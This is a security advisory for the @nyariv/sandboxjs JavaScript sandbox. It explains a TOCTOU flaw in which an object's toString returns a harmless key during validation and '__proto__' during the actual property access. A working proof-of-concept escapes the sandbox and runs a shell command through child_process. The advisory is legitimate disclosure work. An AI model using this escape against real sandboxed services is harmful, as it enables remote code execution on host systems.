summary: "@nyariv/sandboxjs vulnerable to sandbox escape via TOCTOU bug on keys in property\
  \ accesses\n### Summary\nA sandbox escape vulnerabilities due to a mismatch between the key\
  \ on which the validation is performed and the key used for accessing properties.\n\n### Details\n\
  Even though the key used in property accesses (```b``` in the code below) is annotated as\
  \ ```string```, this is never enforced:\nhttps://github.com/nyariv/SandboxJS/blob/6103d7147c4666fe48cfda58a4d5f37005b43754/src/executor.ts#L304-L304\n\
  So, attackers can pass malicious objects that coerce to different string values when used,\
  \ e.g., one for the time the key is sanitized using ```hasOwnProperty(key)``` and a different\
  \ one for when the key is used for the actual property access.\n\n### PoC\n```js\nconst Sandbox\
  \ = require('@nyariv/sandboxjs').default;\n\nconst code = `\nlet a = new Map;\na.x = 23;\n\
  let count = 0;\n\nlet nastyProp = {toString: () => {if (count<1){count++;return \"x\"} else\
  \ return \"__proto__\"}}\nlet mapProt = a[nastyProp];\nmapProt.has = isFinite;\nconsole.log(\n\
  \  isFinite.constructor(\n    \"return process.getBuiltinModule('child_process').execSync('ls\
  \ -lah').toString()\",\n  )(),\n);`;\nconst scope = {};\nconst sandbox = new Sandbox();\n\
  const exec = sandbox.compile(code);\nexec(scope).run(); \n```\n\n### Impact\nRemote code execution,\
  \ if attacker can execute code inside the sandbox."
